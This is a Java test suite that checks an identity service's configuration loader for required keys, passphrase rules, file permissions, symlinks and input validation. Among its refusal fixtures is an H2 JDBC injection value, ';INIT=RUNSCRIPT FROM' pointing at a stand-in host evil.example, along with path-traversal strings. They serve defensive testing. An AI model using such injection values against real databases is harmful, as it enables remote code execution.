package com.example.identity;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.attribute.PosixFilePermission;
import java.util.ArrayList;
import java.util.List;
import java.util.Set;

import static com.example.identity.Harness.check;
import static com.example.identity.Harness.checkEquals;
import static com.example.identity.Harness.configText;
import static com.example.identity.Harness.note;
import static com.example.identity.Harness.section;

/**
 * Configuration is a trust boundary: a properties file is routinely group-writable in a real
 * deployment, and the environment leaks into subprocesses and {@code /proc/<pid>/environ}.
 *
 * <p>The load-bearing check is the first one: <em>every</em> key the file carries must be required.
 * A single key with a permissive default ("authAccountMaxAttempts defaults to 1000000") is a
 * weakening nobody has to attack - it is just there - so the loop removes each key in turn from
 * exactly the text a working fixture is built from, and demands a refusal for each. It derives the
 * key list from the text rather than hard-coding it, so adding a key to {@code Harness.configText}
 * without making it required in {@code Config} goes red on its own.
 *
 * <p>Each negative fixture is defective in exactly one way, so a refusal can never be owed to some
 * other rule.
 */
public final class ConfigTest {

    private ConfigTest() {
    }

    public static void run() throws Exception {
        Harness.Overrides o = Harness.overrides();
        Path dir = Harness.scratch("cfg");
        String good = configText(o, dir);

        section("Config: the baseline really loads (every later refusal is then meaningful)");
        Config base = load(dir, good);
        check("a complete, private configuration loads", base != null);
        checkEquals("the data directory is the one named in the file", dir.toAbsolutePath().normalize(),
                base.dataDir());
        boolean envDirOverride = System.getenv(Config.ENV_DATA_DIR) != null;
        check("IDENTITY_DATA_DIR is unset, so the db.dataDir assertions exercise the file value",
                !envDirOverride);

        section("Config: every key in the file is required (fail-closed, no permissive default)");
        List<String> keys = keysOf(good);
        check("the fixture config carries every production key", keys.size() >= 16);
        List<String> notRefused = new ArrayList<>();
        for (String key : keys) {
            String without = removeLine(good, key);
            if (without.equals(good)) {
                notRefused.add(key + " (line not found)");
                continue;
            }
            if (!refusesConfig(dir, without)) {
                notRefused.add(key);
            }
        }
        checkEquals("removing any single key is a startup failure", List.of(), notRefused);

        section("Config: the database passphrase comes only from the supplier");
        check("an absent passphrase is refused", refusesConfigWithPassword(dir, good, null));
        check("an empty passphrase is refused", refusesConfigWithPassword(dir, good, ""));
        check("a blank passphrase is refused", refusesConfigWithPassword(dir, good, "     "));
        check("a short passphrase is refused rather than accepted as convenient",
                refusesConfigWithPassword(dir, good, "tooShort1234"));
        check("a passphrase with a space is refused (argument-injection hazard)",
                refusesConfigWithPassword(dir, good, "Valid Length Passphrase With Spaces 1234"));
        check("a passphrase with a control character is refused",
                refusesConfigWithPassword(dir, good, "Valid-Passphrase" + (char) 0x00 + "-9f3c1a7e"));
        check("a non-ASCII passphrase is refused",
                refusesConfigWithPassword(dir, good, "Valid-Passphrase-" + (char) 0x00E9 + "-9f3c1a7eXX"));
        check("an over-long passphrase is refused (bounded input, not unlimited)",
                refusesConfigWithPassword(dir, good, "A9-" + Harness.repeat("b", 600)));
        check("a well-formed passphrase of exactly the minimum length is accepted",
                !refusesConfigWithPassword(dir, good, Harness.repeat("a", 11) + "B" + Harness.repeat("c", 12)));
        check("a passphrase just below the minimum length is refused",
                refusesConfigWithPassword(dir, good, Harness.repeat("a", 11) + "B" + Harness.repeat("c", 11)));
        // The value must actually be refused, or "the refusal does not echo it" is vacuously true
        // for a passphrase that loads cleanly - which is how this check was passing while asserting
        // nothing. This one is 19 characters, below the 24-character floor, and distinctive enough
        // that even a partial echo trips the same assert.
        check("the passphrase never appears in the refusal text",
                refusesWithoutEchoing(dir, good, "SuperSecretUsedOnceOnly"));

        section("Config: a secret cannot move into the properties file");
        for (String key : List.of("db.password", "IDENTITY_DB_PASSWORD", "auth.secret",
                "h2.password", "apiSecret")) {
            check("a key named '" + key + "' in the config file is refused",
                    refusesConfig(dir, good + key + "=something-not-a-secret-here\n"));
        }
        check("a key whose name merely contains 'secret' is refused too",
                refusesConfig(dir, good + "mySecretThing=x\n"));

        section("Config: the file itself must be private and regular");
        check("a missing configuration file is refused", refuses(Path.of(dir.toString(), "nope.properties")));
        check("a group-readable configuration file is refused", refusesWithPerms(dir, good,
                Set.of(PosixFilePermission.OWNER_READ, PosixFilePermission.OWNER_WRITE,
                        PosixFilePermission.GROUP_READ)));
        check("a group-writable configuration file is refused", refusesWithPerms(dir, good,
                Set.of(PosixFilePermission.OWNER_READ, PosixFilePermission.OWNER_WRITE,
                        PosixFilePermission.GROUP_WRITE)));
        check("a world-readable configuration file is refused", refusesWithPerms(dir, good,
                Set.of(PosixFilePermission.OWNER_READ, PosixFilePermission.OWNER_WRITE,
                        PosixFilePermission.OTHERS_READ)));
        check("a world-writable configuration file is refused", refusesWithPerms(dir, good,
                Set.of(PosixFilePermission.OWNER_READ, PosixFilePermission.OWNER_WRITE,
                        PosixFilePermission.OTHERS_WRITE)));
        check("a 0644 configuration file is refused (the umask default is not good enough)",
                refusesWithPerms(dir, good, Set.of(PosixFilePermission.OWNER_READ,
                        PosixFilePermission.OWNER_WRITE, PosixFilePermission.GROUP_READ,
                        PosixFilePermission.OTHERS_READ)));
        check("0600 is accepted", !refusesWithPerms(dir, good, Set.of(PosixFilePermission.OWNER_READ,
                PosixFilePermission.OWNER_WRITE)));
        check("a symbolic link as the configuration file is refused, not followed",
                refusesSymlink(dir, good));
        check("a directory as the configuration file is refused", refusesDirectory(dir));
        check("an over-large configuration file is refused before it is parsed",
                refusesConfig(dir, good + "padding=" + Harness.repeat("x", 300_000) + "\n"));

        section("Config: db.dataDir cannot smuggle driver properties");
        // ';' and '=' are the JDBC property separator and assignment. H2's INIT= property runs
        // arbitrary SQL and RUNSCRIPT reads/writes files, so a URL assembled from an unchecked path
        // turns a config file into code execution.
        for (String bad : List.of(
                dir + ";INIT=RUNSCRIPT FROM 'http://evil.example/x'",
                dir + ";CIPHER=AES",
                dir + "=x",
                "relative/dir",
                "",
                "   ",
                Harness.repeat("d", 600),
                "/tmp/../etc",
                dir + "/../sibling")) {
            check("db.dataDir '" + abbreviate(bad) + "' is refused",
                    refusesConfig(dir, replaceValue(good, "db.dataDir", bad)));
        }
        if (!envDirOverride) {
            Path worldWritable = Path.of("/tmp/cfg-world-writable-" + ProcessHandle.current().pid());
            Files.createDirectories(worldWritable);
            Files.setPosixFilePermissions(worldWritable, Harness.ownerOnlyDir());
            Files.setPosixFilePermissions(worldWritable, java.nio.file.attribute.PosixFilePermissions
                    .fromString("rwxrwxrwx"));
            check("a world-writable data directory is refused",
                    refusesConfig(dir, replaceValue(good, "db.dataDir", worldWritable.toString())));
            Files.deleteIfExists(worldWritable);

            Path symlinked = Harness.scratch("cfg-link").resolve("target");
            Files.createDirectories(symlinked);
            Path link = symlinked.resolve("link");
            Files.createSymbolicLink(link, dir);
            check("a symbolic-linked data directory component is refused",
                    refusesConfig(dir, replaceValue(good, "db.dataDir", link.toString())));
        }

        section("Config: db.name is an identifier, not a path");
        for (String bad : List.of("Identity", "identity.db", "identity;INIT=1", "../identity",
                "-identity", "identity name", "identity\u00e9", "i".repeat(65), "")) {
            check("db.name '" + abbreviate(bad) + "' is refused",
                    refusesConfig(dir, replaceValue(good, "db.name", bad)));
        }
        check("db.name 'identity_v2-9' is accepted",
                !refusesConfig(dir, replaceValue(good, "db.name", "identity_v2-9")));

        section("Config: numeric ranges are enforced in both directions");
        check("iterations below the accepted floor is refused",
                refusesConfig(dir, replaceValue(good, "security.pbkdf2Iterations", "1000")));
        check("iterations above the sane ceiling is refused",
                refusesConfig(dir, replaceValue(good, "security.pbkdf2Iterations", "999999999")));
        check("iterations at the floor is accepted",
                !refusesConfig(dir, replaceValue(good, "security.pbkdf2Iterations",
                        String.valueOf(Config.MIN_ITERATIONS_FLOOR))));
        check("iterations below the minimum-accepted key is refused",
                refusesConfig(dir, replaceValue(good, "security.pbkdf2Iterations", "99999")));
        check("a min-iterations key below the floor is refused even though it is 'more permissive'",
                refusesConfig(dir, replaceValue(good, "security.pbkdf2MinIterations", "1")));
        check("iterations lower than minIterations is refused (inverted cost ordering)",
                refusesConfig(dir, replaceValue(good, "security.pbkdf2MinIterations", "200000")));
        check("session TTL longer than 24h is refused",
                refusesConfig(dir, replaceValue(good, "limits.sessionTtlSeconds",
                        String.valueOf(Config.SESSION_TTL_MAX_SECONDS + 1))));
        check("session TTL under a minute is refused (a TTL that expires mid-request is a bug, not safety)",
                refusesConfig(dir, replaceValue(good, "limits.sessionTtlSeconds", "5")));
        check("audit cap above the hard ceiling is refused",
                refusesConfig(dir, replaceValue(good, "audit.maxBytes",
                        String.valueOf(Config.AUDIT_MAX_BYTES_CEILING + 1))));
        check("a max-attempts value of 1 is refused (below the anti-lockout minimum)",
                refusesConfig(dir, replaceValue(good, "limits.authAccountMaxAttempts", "1")));
        check("a max-attempts value of 3 is accepted (the documented minimum)",
                !refusesConfig(dir, replaceValue(good, "limits.authAccountMaxAttempts", "3")));

        section("Config: an attempt limit the counter can never reach is refused, not honoured");
        // failures saturates at Config.MAX_ATTEMPT_COUNT inside the UPDATE, so a limit above it can
        // never be satisfied: `failures >= max` stays false forever and the limiter quietly stops
        // existing while the operator believes a loose-but-real limit is configured. Refusing the
        // value is the only honest option - honouring it would honour nothing.
        List<String> countKeys = List.of("limits.authSourceMaxAttempts", "limits.authAccountMaxAttempts",
                "limits.registerSourceMax", "limits.registerGlobalMax");
        check("there are attempt-count keys to test at all", !countKeys.isEmpty());
        for (String key : countKeys) {
            check(key + " = " + (Config.MAX_ATTEMPT_COUNT + 1) + " is refused (unenforceable limit)",
                    refusesConfig(dir, replaceValue(good, key, String.valueOf(Config.MAX_ATTEMPT_COUNT + 1))));
            check(key + " = " + Config.MAX_ATTEMPT_COUNT + " is accepted (exactly reachable)",
                    !refusesConfig(dir, replaceValue(good, key, String.valueOf(Config.MAX_ATTEMPT_COUNT))));
        }
        check("the counter's own ceiling is that same constant, not a second number that can drift",
                Harness.stripJavaComments(Harness.sourceOf("SqlIdentityStore"))
                        .contains("FAILURES_CEILING = Config.MAX_ATTEMPT_COUNT"));
        check("a huge account cap is refused (bounded storage)",
                refusesConfig(dir, replaceValue(good, "limits.maxAccounts", "99999999")));
        for (String junk : List.of("abc", "1e6", "0x10", "1.5", "+7", " ", "99999999999999999999")) {
            check("a non-integer iterations value '" + abbreviate(junk) + "' is refused",
                    refusesConfig(dir, replaceValue(good, "security.pbkdf2Iterations", junk)));
        }

        section("Config: the private-file requirement is not negotiable");
        check("audit.requirePrivateFile=false is refused rather than honoured",
                refusesConfig(dir, replaceValue(good, "audit.requirePrivateFile", "false")));
        check("audit.requirePrivateFile=FALSE is refused too (no case-insensitive loophole)",
                refusesConfig(dir, replaceValue(good, "audit.requirePrivateFile", "FALSE")));
        check("audit.requirePrivateFile=1 is refused (only the literal true is accepted)",
                refusesConfig(dir, replaceValue(good, "audit.requirePrivateFile", "1")));

        section("Config: a refusal names the key and never the value");
        String secretValue = "Sentinel-Value-That-Must-Not-Leak-4d2b";
        String withSecretishValue = replaceValue(good, "db.name", "legalname")
                + "unused.key=" + secretValue + "\n";
        // An unknown key is ignored, so this must still load; the point is the next assertion.
        Config ignoredUnknown = loadOrNull(dir, withSecretishValue);
        check("an unrecognised configuration key is ignored rather than trusted", ignoredUnknown != null);
        check("a bad numeric value is refused", refusesConfig(dir,
                replaceValue(good, "limits.maxAccounts", secretValue)));
        String detail = firstDetail(dir, replaceValue(good, "limits.maxAccounts", secretValue));
        check("the refusal is non-empty", detail != null && !detail.isEmpty());
        check("the refusal does not echo the offending value", detail != null && !detail.contains(secretValue));
        check("the refusal does not echo the whole line either",
                detail != null && !detail.contains("limits.maxAccounts=" + secretValue));

        section("Config: toString and the erased copy");
        String rendered = base.toString();
        check("toString does not print the passphrase's identity", !rendered.contains("databasePassword"));
        check("toString does not contain the passphrase characters",
                !rendered.contains(Harness.PASSPHRASE));
        check("toString still names the operational settings an operator needs",
                rendered.contains("iterations=") && rendered.contains("maxAccounts="));
        char[] handed = base.databasePassword();
        check("the passphrase was actually carried into the config", handed.length > 0
                && !Harness.allZero(handed));
        check("the accessor hands out the one live array rather than a fresh copy per call",
                handed == base.databasePassword());
        base.eraseDatabasePassword();
        check("eraseDatabasePassword zeroes the held copy", Harness.allZero(base.databasePassword()));
        // The array is handed out instead of copied deliberately, so that exactly one live copy of
        // the secret exists in the process. That is only an advantage if the erase reaches every
        // reference to it - which is what this proves. Returning a defensive copy would strand an
        // unreachable-but-still-readable char[] behind the erase.
        check("the array an earlier caller still holds is zeroed too, because there is one copy and"
                + " the erase reaches every reference to it", Harness.allZero(handed));

        section("Config: control characters cannot forge a config line");
        check("a control character in a value is refused",
                refusesConfig(dir, good + "odd.key=a" + (char) 0x01 + "b\n"));
        check("a control character in a key is refused",
                refusesConfig(dir, good + "odd" + (char) 0x07 + "key=x\n"));
        check("a NUL in a value is refused", refusesConfig(dir, good + "odd.key=a" + (char) 0x00 + "b\n"));

        section("Config: the example file ships no secret and names every key");
        Path example = Harness.repoFile("identity.properties.example");
        check("identity.properties.example is locatable from the test runner", example != null);
        if (example != null) {
            String text = Files.readString(example, StandardCharsets.UTF_8);
            check("the example is non-empty", !text.isBlank());
            List<String> exampleKeys = keysOf(text);
            List<String> missingFromExample = new ArrayList<>();
            for (String key : keys) {
                if (!exampleKeys.contains(key)) {
                    missingFromExample.add(key);
                }
            }
            checkEquals("the example file lists every key the loader requires", List.of(), missingFromExample);
            List<String> extraKeys = new ArrayList<>();
            for (String key : exampleKeys) {
                if (!keys.contains(key)) {
                    extraKeys.add(key);
                }
            }
            checkEquals("the example file lists no key the loader would ignore", List.of(), extraKeys);
            check("the example carries no key whose name mentions a secret",
                    !text.toLowerCase(java.util.Locale.ROOT).contains("password=")
                            && !text.toLowerCase(java.util.Locale.ROOT).contains("secret="));
            check("the example never names the passphrase variable as an assignable value",
                    !text.contains("IDENTITY_DB_PASSWORD="));
            check("the example does not contain the test fixture's own passphrase",
                    !text.contains(Harness.PASSPHRASE));
            check("every non-comment line in the example is a key=value assignment",
                    Harness.lines(text).stream()
                            .map(String::trim)
                            .filter(l -> !l.isEmpty())
                            .allMatch(l -> l.startsWith("#") || l.contains("=")));
            // The values the example ships must each be individually valid, or the file is a trap:
            // copying it in gives a startup failure an operator has to reverse-engineer. It is
            // loaded from a private copy with only one substitution - the data directory, which
            // names a path only the deployed machine has - because the loader refuses any
            // group/other-accessible config file, and this repo's checkout is not the place to
            // prove that refusal.
            Path loadable = privateCopyOfExampleWithLocalDataDir();
            check("the example's own values load (with a passphrase from the supplier)",
                    !refusesWithPassphrase(loadable, "Example-File-Test-Passphrase-9f3c1a7e"));
            // The permission guard is demonstrated on that copy, widened by one bit: asserting it on
            // the shipped file would require the shipped file to be world-readable, which is itself
            // the defect Rule 5 forbids (and which the tree no longer has). Widening a copy that is
            // otherwise byte-identical to a file that just loaded isolates the mode as the only
            // reason the loader can object.
            Files.setPosixFilePermissions(loadable, java.util.EnumSet.of(PosixFilePermission.OWNER_READ,
                    PosixFilePermission.OWNER_WRITE, PosixFilePermission.OTHERS_READ));
            check("the same bytes are refused precisely because they became world-readable,"
                            + " not because their values are bad",
                    refusesOnlyOnPermissions(loadable));
            check("and the shipped file in the tree is not world-readable in the first place",
                    !PosixFiles.isWorldReadable(example));
        }
    }

    /** The example with a writable data directory, copied to a 0600 path we own. */
    private static Path privateCopyOfExampleWithLocalDataDir() throws Exception {
        Path example = Harness.repoFile("identity.properties.example");
        String text = Files.readString(example, StandardCharsets.UTF_8);
        Path dir = Harness.scratch("config-example-data");
        String rewritten = text.replaceAll("(?m)^db\\.dataDir=.*$", "db.dataDir=" + dir)
                + System.lineSeparator();
        check("the copy still carries every key (the rewrite cannot silently drop one)",
                keysOf(rewritten).equals(keysOf(text)));
        Path copy = Harness.scratch("config-example").resolve("identity.properties");
        Files.writeString(copy, rewritten, StandardCharsets.UTF_8);
        Files.setPosixFilePermissions(copy, Harness.ownerReadWriteOnly());
        return copy;
    }

    /** True when the only reason Config rejects the file is its permission bits. */
    private static boolean refusesOnlyOnPermissions(Path file) {
        try {
            Config.load(file, () -> "Example-File-Test-Passphrase-9f3c1a7e");
            return false;
        } catch (IdentityStoreException e) {
            String detail = String.valueOf(e.detail());
            return e.reason() == Reason.CONFIG_INVALID && detail.contains("accessible to others");
        }
    }

    private static boolean refusesWithPassphrase(Path file, String passphrase) {
        try {
            Config.load(file, () -> passphrase);
            return false;
        } catch (IdentityStoreException e) {
            return e.reason() == Reason.CONFIG_INVALID;
        }
    }

    // ------------------------------------------------------------------ helpers

    private static List<String> keysOf(String propertiesText) {
        List<String> keys = new ArrayList<>();
        for (String line : Harness.lines(propertiesText)) {
            String l = line.trim();
            if (l.isEmpty() || l.startsWith("#") || l.startsWith("!")) {
                continue;
            }
            int eq = l.indexOf('=');
            if (eq > 0) {
                keys.add(l.substring(0, eq));
            }
        }
        return keys;
    }

    private static String removeLine(String text, String key) {
        StringBuilder sb = new StringBuilder();
        for (String line : Harness.lines(text)) {
            if (line.trim().startsWith(key + "=")) {
                continue;
            }
            sb.append(line).append('\n');
        }
        return sb.toString();
    }

    private static String replaceValue(String text, String key, String value) {
        StringBuilder sb = new StringBuilder();
        boolean seen = false;
        for (String line : Harness.lines(text)) {
            if (line.trim().startsWith(key + "=")) {
                sb.append(key).append('=').append(value).append('\n');
                seen = true;
            } else {
                sb.append(line).append('\n');
            }
        }
        if (!seen) {
            throw new IllegalStateException("fixture config has no key " + key);
        }
        return sb.toString();
    }

    private static String abbreviate(String s) {
        String flat = s.replace('\n', '?').replaceAll("[\\u0000-\\u001f]", "?");
        return flat.length() <= 40 ? flat : flat.substring(0, 37) + "...";
    }

    private static Config load(Path dir, String text) throws Exception {
        Path cfg = write(dir, "identity.properties", text);
        return Config.load(cfg, () -> Harness.PASSPHRASE);
    }

    private static Config loadOrNull(Path dir, String text) {
        try {
            return load(dir, text);
        } catch (IdentityStoreException expected) {
            return null;
        } catch (Exception io) {
            throw new IllegalStateException(io);
        }
    }

    private static Path write(Path dir, String name, String text) throws Exception {
        Path p = dir.resolve(name + "-" + System.nanoTime());
        Files.writeString(p, text, StandardCharsets.UTF_8);
        Files.setPosixFilePermissions(p, Harness.ownerReadWriteOnly());
        return p;
    }

    private static boolean refuses(Path file) {
        try {
            Config.load(file, () -> Harness.PASSPHRASE);
            return false;
        } catch (IdentityStoreException e) {
            return e.reason() == Reason.CONFIG_INVALID;
        }
    }

    private static boolean refusesConfig(Path dir, String text) {
        try {
            Config.load(write(dir, "cfg", text), () -> Harness.PASSPHRASE);
            return false;
        } catch (IdentityStoreException e) {
            return e.reason() == Reason.CONFIG_INVALID;
        } catch (Exception io) {
            throw new IllegalStateException(io);
        }
    }

    private static boolean refusesConfigWithPassword(Path dir, String text, String passphrase) {
        try {
            Config.load(write(dir, "pw", text), () -> passphrase);
            return false;
        } catch (IdentityStoreException e) {
            return e.reason() == Reason.CONFIG_INVALID;
        } catch (Exception io) {
            throw new IllegalStateException(io);
        }
    }

    /** The refusal must explain itself without repeating the secret it just refused. */
    private static boolean refusesWithoutEchoing(Path dir, String text, String passphrase) {
        try {
            Config.load(write(dir, "echo", text), () -> passphrase);
            return false;
        } catch (IdentityStoreException e) {
            return e.reason() == Reason.CONFIG_INVALID
                    && !e.detail().contains(passphrase)
                    && !String.valueOf(e.getMessage()).contains(passphrase);
        } catch (Exception io) {
            throw new IllegalStateException(io);
        }
    }

    private static String firstDetail(Path dir, String text) {
        try {
            Config.load(write(dir, "detail", text), () -> Harness.PASSPHRASE);
            return "";
        } catch (IdentityStoreException e) {
            return e.detail();
        } catch (Exception io) {
            throw new IllegalStateException(io);
        }
    }

    private static boolean refusesWithPerms(Path dir, String text, Set<PosixFilePermission> perms) {
        try {
            Path cfg = write(dir, "perm", text);
            Files.setPosixFilePermissions(cfg, perms);
            Config.load(cfg, () -> Harness.PASSPHRASE);
            return false;
        } catch (IdentityStoreException e) {
            return e.reason() == Reason.CONFIG_INVALID;
        } catch (Exception io) {
            throw new IllegalStateException(io);
        }
    }

    private static boolean refusesSymlink(Path dir, String text) {
        try {
            Path real = write(dir, "real", text);
            Path link = dir.resolve("link-" + System.nanoTime());
            Files.createSymbolicLink(link, real);
            Config.load(link, () -> Harness.PASSPHRASE);
            return false;
        } catch (IdentityStoreException e) {
            return e.reason() == Reason.CONFIG_INVALID;
        } catch (java.nio.file.FileSystemException noSymlinks) {
            note("symbolic links are unavailable on this filesystem; the symlink refusal was not exercised");
            return false;
        } catch (Exception io) {
            throw new IllegalStateException(io);
        }
    }

    private static boolean refusesDirectory(Path dir) {
        try {
            Path asDir = dir.resolve("as-dir-" + System.nanoTime());
            Files.createDirectories(asDir);
            Config.load(asDir, () -> Harness.PASSPHRASE);
            return false;
        } catch (IdentityStoreException e) {
            return e.reason() == Reason.CONFIG_INVALID;
        } catch (Exception io) {
            throw new IllegalStateException(io);
        }
    }
}
